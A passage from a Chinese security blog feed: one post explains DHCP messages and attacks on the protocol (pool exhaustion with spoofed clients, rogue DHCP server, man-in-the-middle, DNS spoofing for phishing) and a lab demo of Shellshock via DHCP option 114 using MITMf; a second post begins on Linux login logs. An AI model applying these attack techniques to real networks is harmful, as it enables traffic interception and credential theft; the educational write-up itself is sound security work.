<td style="text-align:left">DHCP 服务器收到 Discover 报文后，就会在所配置的地址池中查找一个合适的 IP 地址，加上相应的租约期限和其他配置信息（如网关、DNS 服务器等），构造一个 Offer 报文，发送给用户，告知用户本服务器可以为其提供 IP 地址。（ 只是告诉 Client可以提供，是预分配，还需要 Client 通过 ARP 协议检测该 IP 是否重复）</td>
</tr>
<tr>
<td style="text-align:left">DHCPREQUEST</td>
<td style="text-align:left">客户端发给服务端，用来(1)从众多服务器的 <code>DHCPOFFER</code> 报文中选取一个最先接收到的，摒弃其他的 DHCP 服务器；(2)系统重启后确认之前分配的 IP 是否可用；(3)租期续约（在地址使用租期过去1/2时，会向DHCP服务器发送单播Request报文续延租期，如果没有收到DHCP ACK报文，在租期过去3/4时，发送广播Request报文续延租期。）</td>
</tr>
<tr>
<td style="text-align:left">DHCPACK</td>
<td style="text-align:left">服务端发给客户端，服务端根据收到的 Request 报文中携带的用户 MAC 地址来查找有没有相应的租约记录，如果有则发送     <code>DHCPACK</code>     报文作为回应，通知用户可以使用分配的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">DHCPNAK</td>
<td style="text-align:left">DHCP 服务器收到 <code>Request</code> 报文后，没有发现有相应的租约记录或者由于某些原因（租约到期、客户端移动到别的字网）法正常分配 IP 地址，则发送 <code>NAK</code> 报文作为回应，通知用户无法分配合适的 IP 地址</td>
</tr>
<tr>
<td style="text-align:left">DHCPDECLINE</td>
<td style="text-align:left">DHCP 客户端收到 DHCP 服务器回应的 <code>DHCPACK</code> 报文后，通过地址冲突检测发现服务器分配的地址冲突或者由于其他原因导致不能使用，则发送 <code>Decline</code> 报文，通知服务器所分配的 IP 地址不可用</td>
</tr>
<tr>
<td style="text-align:left">DHCPRELEASE</td>
<td style="text-align:left">当用户不再需要使用已分配的 IP 地址时，就会主动向 DHCP 服务器发送 <code>Release</code> 报文，告知服务器用户不再需要分配 IP 地址，DHCP 服务器会释放被绑定的租约</td>
</tr>
<tr>
<td style="text-align:left">DHCPINFORM</td>
<td style="text-align:left">DHCP 客户端如果需要从 DHCP 服务器端获取更为详细的配置信息，则发送 <code>Inform</code> 报文向服务器进行请求，服务器收到该报文后，将根据租约进行查找，找到相应的配置信息后，发送 <code>DHCPACK</code> 报文回应 DHCP 客户端</td>
</tr>
</tbody>
</table>
<h4 id="1-2-3-DHCP报文交换过程"><a href="#1-2-3-DHCP报文交换过程" class="headerlink" title="1.2.3 DHCP报文交换过程"></a>1.2.3 DHCP报文交换过程</h4><p>主要有两种流程：</p>
<ol>
<li>客户端请求新分配一个 IP 地址；</li>
<li>客户端请求续租当前已有的 IP 地址。</li>
</ol>
<p>客户端请求分配一个新的 IP 地址：</p>
<p><img src="/imgs/1425980484773.png" alt="Alt text"></p>
<p>客户端请求续租当前已有的 IP 地址：</p>
<p><img src="/imgs/1425980550504.png" alt="Alt text"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>要看懂上面的数据包时序图，需要先理解前面表格中介绍过的 DHCP 8 种报文类型里的关键几种。<br>客户端在发送 <code>DHCPDISCOVER</code> 或 <code>DHCPREQUEST</code> 报文时，可以指定发给某个 DHCP 服务器，也可以不指定 DHCP 服务器而进行广播，这两种情况下客户端与服务端数据交互的细节不完全相同。<br>更多细节可参考 RFC2131。</p>
</blockquote>
<h2 id="2-协议缺陷"><a href="#2-协议缺陷" class="headerlink" title="2. 协议缺陷"></a>2. 协议缺陷</h2><p>上面两个时序图，是比较复杂的完整情况，而通常的 DHCP 交互过程可以简化成以下几个关键步骤（也是最容易出问题的几个步骤）：</p>
<ol>
<li>客户端发出一个 <code>DHCPDISCOVER</code> 报文（广播），表明想从一个 DHCP 服务器那里分配到一个 IP 地址；客户端可能会指定想租用一个以前被分配过的 IP 地址，此时会有遭受 “中间人攻击” 的危险（后文详解）；</li>
<li>接收到客户端 <code>DHCPDISCOVER</code>报文的 DHCP 服务器，会发送一个 <code>DHCPOFEER</code> 报文，告诉客户端一个成功分配的 IP 地址，但这个地址不一定是客户端指定想要的那个 IP 地址，这取决于 DHCP 服务器的 IP 地址池中的已分配情况；如果服务端 IP 地址池中有客户端指定想要的 IP 地址，那么 DHCP 服务器就会把这个 IP 地址分配给客户端；如果 DHCP 服务器的 IP 地址池中没有客户端指定想要的 IP 地址，但有其他可用的 IP 地址，则会把其他的 IP 地址分配给客户端；如果 DHCP 服务器的 IP 地址池中已经没有可用的IP 地址，则会返回一个 <code>DHCPNAK</code> 报文；</li>
<li>客户端接收到 DHCP 服务端发送的  <code>DHCPOFEER</code> 报文以后，会发送一个 <code>DHCPREQUEST</code> 报文给服务端，告知服务端即将租用这个分配来的 IP 地址；</li>
<li>DHCP 服务端接收到 客户端的 <code>DHCPREQUEST</code> 报文后，会发送一个 <code>DHCPACK</code> 报文给客户端，告知客户端可以使用了，并在服务端将客户端的 MAC 地址 和 IP 地址绑定，在 IP 地址池中做标记该 IP 地址已分配出去。</li>
</ol>
<h3 id="2-1-拒绝服务"><a href="#2-1-拒绝服务" class="headerlink" title="2.1 拒绝服务"></a>2.1 拒绝服务</h3><p>伪造一批 DHCP 客户端（手动构造 MAC 地址），通过上面的 DHCP 客户端&lt;—-&gt;DHCP服务端之间的数据包交互流程，向当前网络中的 DHCP 服务器申请大量 IP 地址，耗尽 DHCP 服务器中的可用 IP 地址池。这样会造成以下 <strong>拒绝服务</strong> 的效果：</p>
<ul>
<li>DHCP 服务器中 IP 池已耗尽，所有的 IP 地址都分配给攻击发生<strong>之前已上线</strong> 的 <strong>正常主机</strong>、和攻击所伪造的<strong>虚假主机</strong>；</li>
<li>由于 DHCP 服务器已经没能力再分配新的 IP 地址，所以该网络中的其他 <strong>刚上线</strong> 的<strong>正常主机</strong>无法获得可用 IP 地址；</li>
<li>此攻击发生 <strong>之前已经上线</strong> 的 <strong>正常主机</strong> 无法觉察 到攻击已发生；</li>
</ul>
<p>这种方式实现的 <strong>拒绝服务攻击</strong> 有个小问题：某些 DHCP 服务器会通过 <strong>ARP 请求</strong> 数据包或 <strong>ICMP Ping</strong> 数据包探测那些已分配的 IP 地址存活情况，如果探测到某个 IP 地址无响应，则会自动回收该 IP（通常情况 DHCP 客户端那一方，如果机器不关机，不会自动释放当前的 IP 地址）。而我们也有应对方式：加大伪造 DHCP 客户端申请新的 IP 地址的频率，这个频率远高于 DHCP 服务器探测未存活 IP 并将其回收的频率，从而保证只要 DHCP 服务器可以分配 IP 地址，就通过伪造的DHCP 数据包交互将可用的 IP 地址占用。（已有 POC 能应对 DHCP 服务器 <strong>ARP 请求</strong> 形式的探测， <strong>ICMP Ping</strong> 方式未测试）。</p>
<h3 id="2-2-伪造恶意的-DHCP-服务"><a href="#2-2-伪造恶意的-DHCP-服务" class="headerlink" title="2.2 伪造恶意的 DHCP 服务"></a>2.2 伪造恶意的 DHCP 服务</h3><p>黑客可以通过伪造一个 DHCP 服务器在当前网络下进行一些对 DHCP 客户端的欺骗攻击。DHCP 报文中的 <strong><code>options</code></strong> 字段可以由 DHCP Server 向 DHCP Client 指定可用的 <strong>网关</strong> 和 <strong>DNS 服务器地址</strong> ，这样一来，黑客伪造的 DHCP Server 就可以通过构造的 DHCP 数据包向客户端指定恶意的网关或 DNS 服务器地址，从而进一步实施<strong>中间人攻击</strong>。</p>
<h3 id="2-3-中间人攻击"><a href="#2-3-中间人攻击" class="headerlink" title="2.3 中间人攻击"></a>2.3 中间人攻击</h3><h4 id="2-3-1-原理"><a href="#2-3-1-原理" class="headerlink" title="2.3.1 原理"></a>2.3.1 原理</h4><p>上面 <strong>伪造恶意的 DHCP 服务</strong> 是 <strong>中间人攻击</strong> 的关键步骤，<strong>中间人攻击</strong> 最常用的方式是伪造一个 <strong>恶意网关</strong>，将受害者的网络流量都劫持到恶意网关那里，然后可以对流量进行嗅探、修改，从而使操控受害者——当然，前提是伪造的恶意网关必须有数据包转发功能。</p>
<p>按照 DHCP 协议规范，在 DHCP 客户端发出 <code>DHCPDISCOVER</code> 的广播数据包之后，如果本地网络存在多个 DHCP 服务器并且收到客户端的数据包之后各自都回应了 <code>DHCPOFFER</code> 数据包，DHCP 客户端会收到多个 <code>DHCPOFFER</code> 数据包，通常只会选择收到的第一个 <code>DHCPOFFER</code> 数据包。这样一来，其实多个 DHCP 服务器之间存在一个 <strong>竞争关系</strong>，哪一台DHCP服务器响应客户端的速度快、频率高，那么成功接管 DHCP 客户端的可能性就会越大。</p>
<p>在 DHCP 中间人攻击的过程中，恶意的 DHCP 服务器可以专门针对一个 DHCP 客户端进行攻击，一旦收到一个 DHCP 客户端发来的 <code>DHCPDISCOVER</code> 广播包，恶意 DHCP 服务器和真实 DHCP 服务器都会同时响应一个 <code>DHCPOFFER</code>包，只要 恶意 DHCP 服务器的数据包先于真实 DHCP 服务器的数据包到达客户端，恶意 DHCP 服务器就会被客户端选用，中间人攻击的第一步就会成功，否则整个中间人攻击就会失败。</p>
<h4 id="2-3-2-问题"><a href="#2-3-2-问题" class="headerlink" title="2.3.2 问题"></a>2.3.2 问题</h4><p>关于 <strong>DHCP 中间人攻击</strong> 一个明显的问题是，这种攻击在一个小型网络里面很难实施。</p>
<ul>
<li>如果客户端的网卡填充了以前曾用过但当前被回收了的IP，那么中间人攻击将很可能无法实施；</li>
<li>如果客户端的网卡填充了指定想要的某个 IP 地址（上面的曾经用过的旧 IP），而真实的 DHCP 服务器恰好分配了这个指定的 IP 地址给客户端，那么客户端将采用这个指定想要的 IP 地址，而忽略恶意 DHCP 服务器的响应；</li>
<li>唯一可能成功的，是客户端指定想要的这个 IP 地址，真实的 DHCP 服务器无法分配——可能已经分配跟网内的正常主机，也可能被恶意的 DHCP 服务主机用前面说过的 <strong>拒绝服务</strong> 攻击给恶意占用，而恶意 DHCP 服务器的 IP 池则是这些被自己恶意占用的 IP地址（恶意DHCP服务器不能随便伪造一个 IP 地址分配给受害 DHCP 客户端，那样可能造成网段内的 IP 地址冲突）——这时，恶意 DHCP 服务器才有机会成功接管受害主机的 DHCP 服务。</li>
</ul>
<p><strong>DHCP 中间人攻击</strong> 的另一个问题出在攻击的第二阶段——流量劫持。一旦第一阶段成功将受害主机的流量骗到恶意网关，下一步就是具体的流量劫持。流量劫持的完美实施，不仅需要欺骗受害主机、让受害主机把恶意网关误以为真实网关，还要欺骗真实网关、让真实网关把恶意网关误以为受害主机，这样才能完全接管受害主机出、入的双向流量。所以，一个完整的 DHCP 中间人攻击，还需要借助 <strong>ARP欺骗</strong>。</p>
<h3 id="2-4-伪造-DNS-服务"><a href="#2-4-伪造-DNS-服务" class="headerlink" title="2.4 伪造 DNS 服务"></a>2.4 伪造 DNS 服务</h3><p>前面说过，DHCP 服务器可以通过数据包向 DHCP 客户端指定一个 DNS 服务器地址。如果上面的 DHCP 服务欺骗成功，则恶意 DHCP 服务器可以通过这种方式，来对 受害主机进行 <strong>钓鱼攻击</strong>：将某个或某些受害主机用户经常上的网站的域名解析到黑客自己的服务器 IP 上去，在那里用伪造的网站页面，骗取用户登录，便可轻松得到账号、密码、联系方式、身份信息等等。</p>
<h2 id="3-攻击实践"><a href="#3-攻击实践" class="headerlink" title="3. 攻击实践"></a>3. 攻击实践</h2><p>前面一小节列出了 DHCP 协议相关的多种缺陷，即可能导致用户网络被攻击的一些点，本小节做一个简单的实践来演示一下。当然不会掩饰所有的攻击方式，只演示最基础的、简单的 DHCP 服务器欺骗攻击。原理是去年爆出的 <strong><code>Bash-Shellshock</code></strong> 漏洞在 DHCP 客户端中的利用。Linux 自带 DHCP 客户端的实现中，有通过系统调用执行 Shell 命令的代码，而除了标准字段，DHCP 还提供了可选字段（识别号码），在这种情况下，一些恶意的服务器通过可选字段 <code>114</code> 发送包含恶意指令的命令，DHCP 服务端响应的数据包中包含的恶意指令如果被客户端接收，且 Bash 版本存在漏洞，那么恶意指令就会被执行。</p>
<p>这里用到的中间人攻击攻击，还是做 <strong>ARP 中间人攻击</strong> 实验时用到的中间人攻击平台 <strong><code>MITMF</code></strong>，只需在攻击机上开启 DHCP 服务欺骗的指令，等待一个 DHCP 客户端来申请 IP 地址即可：</p>
<ol>
<li>攻击机 Kali 上启动攻击平台<br><img src="/imgs/mitmf_dhcp_hij.png" alt="Alt text"></li>
</ol>
<ol>
<li>受害主机（带有 <code>Shellshock</code> 漏洞的 Ubuntu1204）重启 DHCP 客户端，申请 IP 地址<br><img src="/imgs/dhclient_victim.png" alt="Alt text"></li>
</ol>
<p>即发现受害主机的 DHCP 客户端启动时，倒数第二行打出了 <strong><code>123</code></strong> 这一串异常字符，即是恶意 DHCP 服务器的 <code>echo 123</code> 指令得到了执行。</p>
<h2 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4. 参考资料"></a>4. 参考资料</h2><ol>
<li><a href="http://zh.wikipedia.org/zh/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%8D%8F%E8%AE%AE" target="_blank" rel="external">http://zh.wikipedia.org/zh/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%8D%8F%E8%AE%AE</a></li>
<li><a href="http://seclists.org/vuln-dev/2002/Sep/99" target="_blank" rel="external">http://seclists.org/vuln-dev/2002/Sep/99</a></li>
<li><a href="http://tools.ietf.org/html/rfc2131" target="_blank" rel="external">http://tools.ietf.org/html/rfc2131</a></li>
<li><a href="http://tools.ietf.org/html/rfc2132" target="_blank" rel="external">http://tools.ietf.org/html/rfc2132</a></li>
<li><a href="http://tools.ietf.org/html/rfc951" target="_blank" rel="external">http://tools.ietf.org/html/rfc951</a></li>
<li><a href="https://isc.sans.edu//forums/diary/Cyber+Security+Awareness+Month+Day+6+ports+6768+udp+bootp+and+dhcp/7279/" target="_blank" rel="external">https://isc.sans.edu//forums/diary/Cyber+Security+Awareness+Month+Day+6+ports+6768+udp+bootp+and+dhcp/7279/</a></li>
<li><a href="http://howdoesinternetwork.com/2011/spoofing-attack" target="_blank" rel="external">http://howdoesinternetwork.com/2011/spoofing-attack</a></li>
<li><a href="http://www.freebuf.com/tools/45796.html" target="_blank" rel="external">http://www.freebuf.com/tools/45796.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/07/introducing-mitmf-framework-for-man-in.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/07/introducing-mitmf-framework-for-man-in.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/07/mitmf-update-spoof-plugin_23.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/07/mitmf-update-spoof-plugin_23.html</a></li>
<li><a href="http://sign0f4.blogspot.it/2014/10/mitmf-update-dhcp-pwnage.html" target="_blank" rel="external">http://sign0f4.blogspot.it/2014/10/mitmf-update-dhcp-pwnage.html</a></li>
<li><a href="http://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/" target="_blank" rel="external">http://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-协议原理&quot;&gt;&lt;a href=&quot;#1-协议原理&quot; class=&quot;headerlink&quot; title=&quot;1. 协议原理&quot;&gt;&lt;/a&gt;1. 协议原理&lt;/h2&gt;&lt;h3 id=&quot;1-1-简介&quot;&gt;&lt;a href=&quot;#1-1-简介&quot; class=&quot;headerlink&quot; title=&quot;1.1 简介&quot;&gt;&lt;/a&gt;1.1 简介&lt;/h3&gt;&lt;p&gt;DHCP( Dynamic Host Configuration Protocol, 动态主机配置协议)，是一个局域网的网络协议，使用 UDP 协议工作， 主要有两个用途：给内部网络或网络服务供应商自动分配 IP 地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段，在 RFC 2131 中有详细的描述。DHCP 有3个端口，其中 UDP67 和 UDP68 为正常的 DHCP 服务端口，分别作为 DHCP Server 和 DHCP Client 的服务端口；546 号端口用于 DHCPv6 Client ，而不用于 DHCPv4，是为 DHCP Failover 服务，这是需要特别开启的服务，DHCP Failover 是用来做“双机热备”的。&lt;/p&gt;
&lt;p&gt;在 IP 网络中，每个连接 Internet 的设备都需要分配唯一的 IP 地址。DHCP 使网络管理员能从中心结点监控和分配 IP 地址。当某台计算机移到网络中的其它位置时，能自动收到新的 IP 地址，而不用在每台计算机上单独配置固定的 IP 地址。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="dhcp" scheme="http://jiayu0x.com/tags/dhcp/"/>
    
      <category term="intranet" scheme="http://jiayu0x.com/tags/intranet/"/>
    
  </entry>
  
  <entry>
    <title>Linux 日志剖析</title>
    <link href="http://jiayu0x.com/2015/01/02/Linux-log-and-analysis/"/>
    <id>http://jiayu0x.com/2015/01/02/Linux-log-and-analysis/</id>
    <published>2015-01-01T16:00:00.000Z</published>
    <updated>2017-04-04T10:46:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 系统中的日志大概可以分为以下几类：</p>
<ul>
<li>用户访问日志</li>
<li>进程监控日志</li>
<li>系统与服务日志</li>
</ul>
<p>本文将对这几种日志进行详细剖析。</p>
<blockquote>
<p><strong>NOTE</strong>:<br>本文中的例子，如非特殊说明，均在 <code>CentOS7</code> 上实施。</p>
</blockquote>
<h2 id="1-用户访问日志"><a href="#1-用户访问日志" class="headerlink" title="1. 用户访问日志"></a>1. 用户访问日志</h2><p>用户的登录时间日志一般由 <code>/var/log/wtmp</code> 和 <code>/var/run/utmp</code> 这两个文件记录，不过这两个文件无法直接 <code>cat</code> 命令查看，并且该文件由系统自动更新。这两个文件中的内容可以用 <code>w/who/finger/id/last/ac/uptime</code> 这几个命令来查看。 <code>/var/log/lastlog</code> 文件记录用户最后登录的信息，可用 <code>lastlog</code> 命令来查看。</p>
<a id="more"></a>
<p>日志文件是多数重用 UNIX 日志子系统的关键——保持用户登录进入和退出的纪录。有关当前登录用户的信息记录在文件 <code>/var/run/utmp</code> 中；登录进入和退出纪录在文件 <code>/var/log/wtmp</code> 中；最后一次登录文件可以用 <code>lastlog</code> 命令察看。数据交换、关机和重起也记录在 <code>/var/log/wtmp</code> 文件中。所有的纪录都包含时间戳。这些文件（ <code>/var/log/lastlog</code> 通常不大）在具有大量用户的系统中增长十分迅速。例如wtmp文件可以无限增长，除非定期截取。许多系统以一天或者一周为单位把 <code>/var/log/wtmp</code> 配置成循环使用。它通常由 <code>cron</code> 运行的脚本来修改。这些脚本重新命名并循环使用 <code>/var/log/wtmp</code> 文件。通常， <code>/var/log/wtmp</code> 在第一天结束后命名为 <code>wtmp.1</code> ；第二天后 <code>wtmp.1</code>变为 <code>wtmp.2</code> 等等，直到 <code>wtmp.7</code>。</p>
<p>每次有一个用户登录时， <code>login</code> 程序在文件 <code>lastlog</code> 中察看用户的 <code>UID</code> 。如果找到了，则把用户上次登录、退出时间和主机名写到标准输出中，然后 <code>login</code> 程序在 <code>/var/log/lastlog</code>中纪录新的登录时间。在新的 <code>/var/log/lastlog</code> 纪录写入后， <code>/var/run/utmp</code> 文件打开并插入用户的 <code>utmp</code> 纪录。该纪录一直用到用户登录退出时删除。  <code>/var/run/utmp</code> 文件被各种命令文件使用，包括 <code>who</code> 、<code>w</code> 、<code>users</code> 和 <code>finger</code>。</p>
<p>下一步，<code>login</code> 程序打开文件 <code>/var/log/wtmp</code> 附加用户的 <code>utmp</code> 纪录。当用户登录退出时，具有更新时间戳的同一 <code>utmp</code> 纪录附加到文件中。 <code>/var/log/wtmp</code> 文件被程序 <code>last</code> 和 <code>ac</code> 使用。</p>
<hr>
<h3 id="1-1-who-命令"><a href="#1-1-who-命令" class="headerlink" title="1.1 who 命令"></a>1.1 <code>who</code> 命令</h3><p>该命令查询  <code>/var/run/utmp</code> 文件并报告 <strong>当前登录</strong> 的每个用户。<code>who</code> 的缺省输出包括 <strong>用户名</strong>、<strong>终端类型</strong>、<strong>登录日期</strong> 及 <strong>远程主机</strong>。例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ who</div><div class="line">root     tty1         2014-12-29 16:34</div><div class="line">root     pts/0        2014-12-29 15:48 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-12-29 16:40 (ses-254-254.geology.ohio-state.edu)</div></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>NOTE</strong>:<br>关于 <code>tty/pts</code> 的概念，可参考： <a href="http://7056824.blog.51cto.com/69854/276610" target="_blank" rel="external">Linux中tty、pty、pts的概念区别</a></p>
</blockquote>
<p>如果指明了 <code>wtmp</code> 的文件名，则 <code>who</code> 命令查询所有以前的纪录。命令 <code>who /var/log/wtmp</code> 将报告 <strong>自从 <code>/var/log/wtmp</code> 文件创建或删改以来的每一次登录</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ who /var/log/wtmp</div><div class="line">root     tty1         2014-10-16 17:35</div><div class="line">root     tty1         2014-10-16 19:42</div><div class="line">root     tty1         2014-10-16 20:05</div><div class="line">root     pts/0        2014-10-17 10:56 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-10-17 13:55 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/1        2014-10-17 14:00 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     pts/2        2014-10-17 14:59 (ses-254-254.geology.ohio-state.edu)</div><div class="line">root     tty1         2014-10-20 17:53</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h3 id="1-2-w-命令"><a href="#1-2-w-命令" class="headerlink" title="1.2 w 命令"></a>1.2 <code>w</code> 命令</h3><p>该命令查询 <code>/var/log/wtmp</code> 文件并显示 <strong>当前</strong> 系统中每个用户和它所运行的进程信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜ w</div><div class="line"> 17:00:52 up 3 days,  2:16,  3 users,  load average: 0.06, 0.03, 0.05</div><div class="line">USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT</div><div class="line">root     tty1      16:34   26:12   0.11s  0.11s -zsh</div><div class="line">root     pts/0     15:48    4.00s  0.19s  0.02s w</div><div class="line">root     pts/1     16:57   20.00s  0.74s  0.08s zsh</div></pre></td></tr></table></figure></p>
<h3 id="1-3-users-命令"><a href="#1-3-users-命令" class="headerlink" title="1.3 users 命令"></a>1.3 <code>users</code> 命令</h3><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ users</div><div class="line">root root root</div></pre></td></tr></table></figure></p>
<h3 id="1-4-id-命令"><a href="#1-4-id-命令" class="headerlink" title="1.4 id 命令"></a>1.4 <code>id</code> 命令</h3><p>与上面 <code>users</code> 命令类似，但可以显示更多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ id</div><div class="line">uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</div><div class="line">➜ id root</div><div class="line">uid=0(root) gid=0(root) 组=0(root)</div></pre></td></tr></table></figure></p>
<p><code>id</code> 命令可以显示用户组信息以及更为复杂的 <code>SELinux</code> 上下文信息（比如第一条命令，如果系统启用了 <code>SELinux</code> ，默认就会输出 <code>SELinux</code> 上下文信息）；第二条命令指定输出某个用户名的信息时，则会只输出用户和组信息。</p>
<h3 id="1-5-last-命令"><a href="#1-5-last-命令" class="headerlink" title="1.5 last 命令"></a>1.5 <code>last</code> 命令</h3><p>该命令往回搜索 <code>/var/log/wtmp</code> 文件来显示自从该文件第一次创建以来所有登录过的用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜ last</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:57   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:49 - 16:57  (00:08)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:40 - 16:47  (00:06)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:36 - 16:40  (00:04)</div><div class="line">root     tty1                          Mon Dec 29 16:34   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:33 - 16:33  (00:00)</div><div class="line">root     pts/0        ses-254-254.geol Mon Dec 29 15:48   still logged in</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 14:48 - 18:04  (03:15)</div><div class="line">reboot   system boot  3.10.0-123.13.2. Fri Dec 26 14:44 - 17:12 (3+02:27)</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 10:23 - down   (00:07)</div><div class="line">root     tty1                          Wed Dec 24 10:00 - down  (2+00:30)</div><div class="line">reboot   system boot  3.10.0-123.13.2. Wed Dec 24 09:58 - 10:31 (2+00:32)</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">wtmp begins Thu Oct 16 17:33:46 2014</div></pre></td></tr></table></figure></p>
<p><strong>如果指明了用户，则该命令只显示该用户的近期活动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ last root</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:57   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:49 - 16:57  (00:08)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:40 - 16:47  (00:06)</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:36 - 16:40  (00:04)</div><div class="line">root     tty1                          Mon Dec 29 16:34   still logged in</div><div class="line">root     pts/1        ses-254-254.geol Mon Dec 29 16:33 - 16:33  (00:00)</div><div class="line">root     pts/0        ses-254-254.geol Mon Dec 29 15:48   still logged in</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 14:48 - 18:04  (03:15)</div><div class="line">root     pts/0        ses-254-254.geol Fri Dec 26 10:23 - down   (00:07)</div><div class="line">root     tty1                          Wed Dec 24 10:00 - down  (2+00:30)</div><div class="line"></div><div class="line">......</div><div class="line"></div><div class="line">wtmp begins Thu Oct 16 17:33:46 2014</div></pre></td></tr></table></figure></p>
<h3 id="1-6-ac-命令"><a href="#1-6-ac-命令" class="headerlink" title="1.6 ac 命令"></a>1.6 <code>ac</code> 命令</h3><p>命令根据当前的 <code>/var/log/wtmp</code> 文件中的登录进入和退出来报告用户连结的时间（小时），如果不使用标志，则报告总的时间：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ac</div><div class="line">    total      231.40</div></pre></td></tr></table></figure></p>
<p><strong><code>ac -p</code> 显示每个用户的总的连接时间：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ ac -p</div><div class="line">    root                               231.45</div><div class="line">    total      231.45</div></pre></td></tr></table></figure></p>
<p><strong><code>ac -d</code> 显示每天总的连接时间：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">➜ ac -d</div><div class="line">Oct 16  total        6.14</div><div class="line">Oct 17  total       40.45</div><div class="line">Oct 20  total        6.11</div><div class="line">Oct 21  total       24.01</div><div class="line">Oct 22  total       30.66</div><div class="line">Dec 10  total        7.08</div><div class="line">Dec 12  total        5.11</div><div class="line">Dec 15  total        7.79</div><div class="line">Dec 16  total       10.32</div><div class="line">Dec 17  total        5.17</div><div class="line">Dec 18  total        9.01</div><div class="line">Dec 19  total        7.75</div><div class="line">Dec 22  total       10.64</div><div class="line">Dec 23  total        6.19</div><div class="line">Dec 24  total       13.99</div><div class="line">Dec 26  total       37.92</div><div class="line">Today   total        3.11</div></pre></td></tr></table></figure></p>
